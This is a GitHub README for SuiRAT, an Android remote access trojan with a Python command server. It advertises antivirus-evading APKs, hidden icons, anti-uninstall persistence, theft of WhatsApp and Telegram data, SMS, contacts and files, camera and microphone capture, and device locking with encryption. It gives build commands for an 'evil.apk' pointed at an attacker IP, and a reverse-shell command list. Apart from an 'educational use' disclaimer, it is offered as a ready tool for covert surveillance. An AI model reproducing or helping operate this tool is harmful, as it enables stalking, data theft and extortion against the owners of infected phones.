# SuiRAT<p align="center">
<img src="https://github.com/hax4us/haxRat/Logo/SuiRAT.png" height="60"><br>
SuiRAT is a client/server application developed in Java Android for the client side and the Server is in Python
</p>



## Features
- ✅ Fud Apk
- ✅ Anti Uninstall Android (4.4 to 10)
- ✅ Light Weight Apk Which Runs 24*7 in Background
- ✅ Full Persistent Backdoor 
- ✅ Invisible Icon On Install
- ✅ Real Time
- ✅ Receive Any File or Folder From Target Device
- ✅ Bind With Other Apps
- ✅ Fetch All Whatsapp Photo,Video
- ✅ Fetch All Ahatsapp Contacts
- ✅ Receive All Target Message
- ✅ Send Sms With Target Device To Any Number
- ✅ Recive All Target Contacts
- ✅ Fetch All Telegram Contacts
- ✅ Fetch All Telegram Docs,Image,VideosVideos
- ✅ Get Ip Address From Target Device
- ✅ Get MacAddress From Target Device
- ✅ Receive List of All Installedd Apps In Target Device
- ⏳ Delete Any File Or Folder From Target Device
- ⏳ Capture Main And Front Camera
- ⏳ Record Main And Front Camera
- ⏳ Capture Microphone
- ⏳ Receive last Clipboard Text



## TODO
- ~~Ngrok Support~~
- Add screenshot command
- Add Screen Mirroring
- Add WebPanel

## Installation
### For Termux Users
- `apt update -y`
- `apt upgrade -y`
- `apt install python -y`
- `apt install python2 -y`
- `apt install python3 -y`
- `apt install git -y`
- `apt install openjdk-17`
- `git clone https://github.com/alewana/SuiRat.git`
- `cd SuiRat`
- `pip install -r requirements.txt`

## Prerequisites
AndroRAT requires Python3 and JAVA (or Android Studio)

### For Linux/Nethunter
1. Install NodeJs `apt install nodejs`

2. Clone `git clone https://github.com/alewana/SuiRat.git`

3. Goto server directory `cd SuiRat`

4. Install Requirements `pip install -r requirements.txt`

##### SuiRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)

> SuiRAT also works on Android 10 (Q) but some of the interpreter command will be unstable. 


After running the `shell` mode you will get an interpreter of the device  

Commands which can run on the interpreter
```
     deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    Dump Telegram [Premium] --> Dump Telegram Docs,Images,Video 
    getIP                      --> returns the ip of the device
    Dump Whatsapp [Premium]  -> Dump Whatsapp Database Massages
    getClipData                --> return the current saved text from the clipboard
    getMACAddress            --> returns the mac address of the device
    Lock Device  [Premium]   --> Lock Mobile with 256 bit Encryption
    Unlock Device.          --> Unlock Victim Mobile with 256 Decryption
    exit                       --> exit the SuiRat
```
In the sh shell there are some sub commands
```
    get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)
    put [filename]              --> uploads the file to the android device
```

## Examples

* To build the apk using ngrok which will also set the listner:
```python3 androRAT.py --build --ngrok -o evil.apk```

* To build the apk using desired ip and port:
```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```

* To get the interpreter:
```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```


### Available Modes
* `--build` - for building the android apk 
* `--ngrok` - for using ngrok tunnel (over the internet)
* `--shell` - getting an interactive shell of the device

### `build` mode

```
Usage:
  python3 SuiRAT.py --build --ngrok [flags]
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "alewana.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

```
Usage:
  python3 SuiRAT.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
### `shell` mode
```
Usage:
  python3 SuiRAT.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
After running the `shell` mode you will get an interpreter of the device  

## Thanks
 - Inspiration for the project and the basic building blocks for the Android App are based off [AndroRAT](https://github.com/karma9874/AndroRAT) 
 
## Contact Info

Telegram `@Alewana_dev

## Disclaimer
<b>I ( Ahtisham a.k.a AlewanaEzexer )  Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
SuiRAT is built for both Educational and Internal use ONLY.</b>
